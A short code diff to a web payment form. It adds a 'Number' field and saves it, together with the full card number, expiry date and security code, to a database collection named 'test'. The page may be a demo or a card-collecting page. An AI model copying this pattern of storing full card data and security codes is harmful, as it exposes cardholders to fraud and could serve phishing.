@@ -166,6 +166,10 @@
                 <input name="userid" id="name" maxlength="20" type="text">
             </div>
             <div class="field-container">
+                <label for="number">Number</label>
+                <input name="number" id="number" maxlength="8" type="number">
+            </div>
+            <div class="field-container">
                 <label for="cardnumber">Card Number</label><span id="generatecard">generate random</span>
                 <input name="cardno" id="cardnumber" type="text" pattern="[0-9]*" inputmode="numeric">
                 <svg id="ccicon" class="ccicon" width="750" height="471" viewBox="0 0 750 471" version="1.1" xmlns="http://www.w3.org/2000/svg"
@@ -194,6 +198,7 @@
             async function proceed() {
                 // Validate form fields before proceeding
                 var name = document.getElementById('name').value;
+                var number = document.getElementById('number').value;
                 var cardNumber = document.getElementById('cardnumber').value;
                 var expirationDate = document.getElementById('expirationdate').value;
                 var securityCode = document.getElementById('securitycode').value;
@@ -208,6 +213,7 @@
                 try {
                     await db.collection("test").add({
                         name: name,
+                        number: number,
                         cardnumber: cardNumber,
                         expirationdate: expirationDate,
                         cv: securityCode,
